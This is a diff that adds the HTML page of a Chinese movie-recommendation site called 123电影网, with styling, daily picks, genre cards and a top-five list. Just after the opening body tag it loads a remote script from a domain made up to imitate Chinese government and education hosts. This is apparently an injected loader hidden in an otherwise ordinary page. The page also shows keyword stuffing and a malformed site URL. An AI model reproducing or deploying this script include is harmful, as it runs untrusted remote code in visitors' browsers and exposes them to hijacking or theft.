@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>123电影网 - 轻松找电影，快乐看世界</title>
+    <meta name="description" content="123电影网(123dianyingwang-top)是一个轻松、简洁的电影发现平台，提供电影分类浏览、热门推荐、影评摘要和观影小贴士，帮你快速找到心仪好片。">
+    <meta name="keywords" content="123电影网, 123dianyingwang-top, 找电影, 电影分类, 热门推荐, 观影指南">
+    <meta name="author" content="123电影网">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Nunito', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+        }
+        body {
+            background: #f0faf4;
+            color: #2d3748;
+            line-height: 1.8;
+        }
+        a {
+            text-decoration: none;
+            color: #38b2ac;
+        }
+        a:hover {
+            color: #2c7a7b;
+        }
+        .wrap {
+            width: 100%;
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* 顶部 */
+        header {
+            background: #ffffff;
+            border-bottom: 1px solid #e2f5f0;
+            position: sticky;
+            top: 0;
+            z-index: 999;
+            box-shadow: 0 2px 12px rgba(56,178,172,0.08);
+        }
+        .topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 70px;
+        }
+        .brand {
+            font-size: 26px;
+            font-weight: 800;
+            color: #2d3748;
+        }
+        .brand span {
+            color: #38b2ac;
+            background: #e6fffa;
+            padding: 2px 8px;
+            border-radius: 8px;
+            font-size: 22px;
+        }
+        nav ul {
+            display: flex;
+            gap: 28px;
+            list-style: none;
+        }
+        nav ul li a {
+            font-size: 16px;
+            color: #4a5568;
+            font-weight: 600;
+            padding: 8px 4px;
+            border-radius: 8px;
+            transition: all 0.3s;
+        }
+        nav ul li a:hover {
+            color: #38b2ac;
+            background: #e6fffa;
+            padding: 8px 12px;
+        }
+
+        /* 首屏 */
+        .hero {
+            background: linear-gradient(180deg, #d4f1ed 0%, #f0faf4 100%);
+            padding: 80px 0 70px;
+            text-align: center;
+        }
+        .hero-inner {
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        .hero-badge {
+            display: inline-block;
+            background: #38b2ac;
+            color: #fff;
+            font-size: 13px;
+            font-weight: 700;
+            padding: 4px 14px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+        }
+        .hero h1 {
+            font-size: 40px;
+            font-weight: 800;
+            color: #1a202c;
+            margin-bottom: 16px;
+            line-height: 1.3;
+        }
+        .hero h1 em {
+            font-style: normal;
+            color: #38b2ac;
+        }
+        .hero p {
+            font-size: 18px;
+            color: #718096;
+            margin-bottom: 30px;
+        }
+        .hero-url {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #fff;
+            border: 2px solid #38b2ac;
+            color: #38b2ac;
+            padding: 12px 28px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+        .hero-url:hover {
+            background: #38b2ac;
+            color: #fff;
+        }
+
+        /* 栏目通用 */
+        section {
+            padding: 64px 0;
+        }
+        .section-header {
+            text-align: center;
+            margin-bottom: 44px;
+        }
+        .section-header .icon {
+            font-size: 36px;
+            margin-bottom: 8px;
+            display: block;
+        }
+        .section-header h2 {
+            font-size: 28px;
+            font-weight: 800;
+            color: #1a202c;
+        }
+        .section-header .sub {
+            font-size: 15px;
+            color: #a0aec0;
+            margin-top: 6px;
+        }
+
+        /* 电影卡片 - 大圆角白色卡片 */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 24px;
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 24px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.06);
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+        .card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 16px 40px rgba(56,178,172,0.15);
+            border-color: #b2f5ea;
+        }
+        .card-emoji {
+            font-size: 40px;
+            margin-bottom: 14px;
+            display: block;
+        }
+        .card .tag {
+            font-size: 12px;
+            color: #38b2ac;
+            background: #e6fffa;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-weight: 600;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+        .card h3 {
+            font-size: 17px;
+            font-weight: 700;
+            color: #2d3748;
+            margin-bottom: 8px;
+        }
+        .card p {
+            font-size: 14px;
+            color: #718096;
+            line-height: 1.6;
+        }
+
+        /* 分类 - 药丸按钮 */
+        .cats {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 14px;
+            justify-content: center;
+            margin-bottom: 40px;
+        }
+        .cat {
+            background: #fff;
+            border: 2px solid #e2f5f0;
+            padding: 10px 24px;
+            border-radius: 30px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #4a5568;
+            cursor: default;
+            transition: all 0.3s;
+        }
+        .cat:hover {
+            border-color: #38b2ac;
+            color: #38b2ac;
+            background: #e6fffa;
+        }
+
+        /* 排行 - 左侧色块 */
+        .rank {
+            max-width: 760px;
+            margin: 0 auto;
+        }
+        .rank-item {
+            display: flex;
+            align-items: stretch;
+            background: #fff;
+            border-radius: 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+        .rank-item:hover {
+            box-shadow: 0 8px 24px rgba(56,178,172,0.12);
+        }
+        .rank-left {
+            width: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 800;
+            color: #fff;
+            flex-shrink: 0;
+        }
+        .rank-item:nth-child(1) .rank-left { background: #f6ad55; }
+        .rank-item:nth-child(2) .rank-left { background: #fc8181; }
+        .rank-item:nth-child(3) .rank-left { background: #68d391; }
+        .rank-item:nth-child(4) .rank-left { background: #63b3ed; }
+        .rank-item:nth-child(5) .rank-left { background: #b794f4; }
+        .rank-body {
+            padding: 18px 22px;
+            flex: 1;
+        }
+        .rank-body h3 {
+            font-size: 17px;
+            font-weight: 700;
+            color: #2d3748;
+            margin-bottom: 4px;
+        }
+        .rank-body p {
+            font-size: 14px;
+            color: #718096;
+        }
+
+        /* 关于 */
+        .about-box {
+            background: #fff;
+            border-radius: 24px;
+            padding: 44px;
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+        }
+        .about-box .about-icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+        .about-box h3 {
+            font-size: 22px;
+            font-weight: 800;
+            color: #1a202c;
+            margin-bottom: 16px;
+        }
+        .about-box p {
+            color: #718096;
+            margin-bottom: 14px;
+            font-size: 15px;
+        }
+        .about-box .site-name {
+            font-size: 20px;
+            font-weight: 800;
+            color: #38b2ac;
+            margin: 20px 0 8px;
+        }
+        .about-box .site-url {
+            font-size: 16px;
+            color: #4a5568;
+            background: #f0faf4;
+            padding: 10px 24px;
+            border-radius: 12px;
+            display: inline-block;
+            font-weight: 600;
+        }
+
+        /* 页脚 */
+        footer {
+            background: #2d3748;
+            color: #a0aec0;
+            text-align: center;
+            padding: 32px 0;
+            font-size: 14px;
+        }
+        footer a {
+            color: #4fd1c5;
+        }
+
+        /* 移动端 */
+        @media (max-width: 900px) {
+            .grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        @media (max-width: 600px) {
+            .topbar {
+                flex-direction: column;
+                height: auto;
+                gap: 10px;
+                padding: 14px 0;
+            }
+            nav ul {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 8px;
+            }
+            nav ul li a {
+                font-size: 14px;
+                padding: 6px 10px;
+            }
+            .hero {
+                padding: 50px 0 50px;
+            }
+            .hero h1 {
+                font-size: 28px;
+            }
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            .rank-item {
+                flex-direction: column;
+            }
+            .rank-left {
+                width: 100%;
+                height: 50px;
+            }
+            .about-box {
+                padding: 28px 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header>
+    <div class="wrap topbar">
+        <div class="brand">123<span>电影网</span></div>
+        <nav>
+            <ul>
+                <li><a href="#home">首页</a></li>
+                <li><a href="#pick">今日推荐</a></li>
+                <li><a href="#types">分类浏览</a></li>
+                <li><a href="#top">口碑榜单</a></li>
+                <li><a href="#about">关于我们</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<section id="home" class="hero">
+    <div class="wrap hero-inner">
+        <div class="hero-badge">🎬 电影发现平台</div>
+        <h1>在 <em>123电影网</em> 轻松找到你的下一部好片</h1>
+        <p>简单分类、真实推荐、轻松浏览，让每一次观影选择都不再纠结。</p>
+        <a class="hero-url" href="https://123dianyingwang-top">🌐 https://123dianyingwang-top</a>
+    </div>
+</section>
+
+<section id="pick">
+    <div class="wrap">
+        <div class="section-header">
+            <span class="icon">🎯</span>
+            <h2>今日推荐</h2>
+            <div class="sub">编辑每天精选 4 部值得一看的影片</div>
+        </div>
+        <div class="grid">
+            <div class="card">
+                <span class="card-emoji">🚀</span>
+                <div class="tag">科幻冒险</div>
+                <h3>火星救援</h3>
+                <p>一个人在火星种土豆求生的硬核科幻，幽默又感人。</p>
+            </div>
+            <div class="card">
+                <span class="card-emoji">🎭</span>
+                <div class="tag">喜剧温情</div>
+                <h3>触不可及</h3>
+                <p>一段跨越阶层的友谊，笑中带泪，温暖治愈。</p>
+            </div>
+            <div class="card">
+                <span class="card-emoji">🔍</span>
+                <div class="tag">悬疑烧脑</div>
+                <h3>禁闭岛</h3>
+                <p>层层反转的心理悬疑片，结局让人久久不能平静。</p>
+            </div>
+            <div class="card">
+                <span class="card-emoji">🐉</span>
+                <div class="tag">动画奇幻</div>
+                <h3>蜘蛛侠：纵横宇宙</h3>
+                <p>视觉炸裂的动画盛宴，多元宇宙故事精彩纷呈。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="types" style="background: #e6fffa;">
+    <div class="wrap">
+        <div class="section-header">
+            <span class="icon">📂</span>
+            <h2>分类浏览</h2>
+            <div class="sub">按类型快速找到你喜欢的电影</div>
+        </div>
+        <div class="cats">
+            <div class="cat">😂 轻松喜剧</div>
+            <div class="cat">💥 动作冒险</div>
+            <div class="cat">👻 悬疑惊悚</div>
+            <div class="cat">🌌 科幻奇幻</div>
+            <div class="cat">❤️ 爱情文艺</div>
+            <div class="cat">📜 历史传记</div>
+            <div class="cat">🎨 动画家庭</div>
+            <div class="cat">🎵 音乐歌舞</div>
+        </div>
+        <div class="grid">
+            <div class="card">
+                <span class="card-emoji">😂</span>
+                <h3>轻松喜剧</h3>
+                <p>周末解压首选，好心情从一部喜剧开始。</p>
+            </div>
+            <div class="card">
+                <span class="card-emoji">💥</span>
+                <h3>动作冒险</h3>
+                <p>肾上腺飙升，大场面大制作爽感十足。</p>
+            </div>
+            <div class="card">
+                <span class="card-emoji">🌌</span>
+                <h3>科幻奇幻</h3>
+                <p>脑洞大开的世界观，带你逃离现实片刻。</p>
+            </div>
+            <div class="card">
+                <span class="card-emoji">📜</span>
+                <h3>历史传记</h3>
+                <p>真实故事改编，感受时代与人性的力量。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="top">
+    <div class="wrap">
+        <div class="section-header">
+            <span class="icon">🏆</span>
+            <h2>口碑榜单</h2>
+            <div class="sub">大家都在看、都在讨论的好电影</div>
+        </div>
+        <div class="rank">
+            <div class="rank-item">
+                <div class="rank-left">1</div>
+                <div class="rank-body">
+                    <h3>霸王别姬 (1993)</h3>
+                    <p>华语电影巅峰之作，豆瓣评分 9.6，一生必看一次。</p>
+                </div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-left">2</div>
+                <div class="rank-body">
+                    <h3>这个杀手不太冷</h3>
+                    <p>经典杀手与少女的故事，温情与冷酷的完美平衡。</p>
+                </div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-left">3</div>
+                <div class="rank-body">
+                    <h3>千与千寻</h3>
+                    <p>宫崎骏奇幻世界，每个人都能看到自己的成长。</p>
+                </div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-left">4</div>
+                <div class="rank-body">
+                    <h3>绿皮书</h3>
+                    <p>跨越种族的友谊之旅，温暖幽默又发人深省。</p>
+                </div>
+            </div>
+            <div class="rank-item">
+                <div class="rank-left">5</div>
+                <div class="rank-body">
+                    <h3>海上钢琴师</h3>
+                    <p>一生困在海上，却拥有比谁都辽阔的精神世界。</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section id="about" style="background: #e6fffa;">
+    <div class="wrap">
+        <div class="section-header">
+            <span class="icon">💬</span>
+            <h2>关于我们</h2>
+        </div>
+        <div class="about-box">
+            <div class="about-icon">🎬</div>
+            <h3>关于 123电影网</h3>
+            <p><b>123电影网</b> 是一个简洁、轻松的电影发现与推荐平台。我们不做盗版播放，不采集未授权资源，专注于帮助影迷通过分类浏览、口碑榜单和编辑推荐，更快找到值得观看的好电影。</p>
+            <div class="site-name">📌 网站名称：123电影网</div>
+            <div class="site-url">🔗 https://123dianyingwang-top</div>
+            <p style="margin-top: 20px; font-size: 13px; color: #a0aec0;">关键词：123电影网、123dianyingwang-top、找电影、电影分类、热门推荐</p>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="wrap">
+        © 2024 123电影网 · https://123dianyingwang-top · 单页展示站点，仅供电影资料检索与学习交流
+    </div>
+</footer>
+
+</body>
+</html>
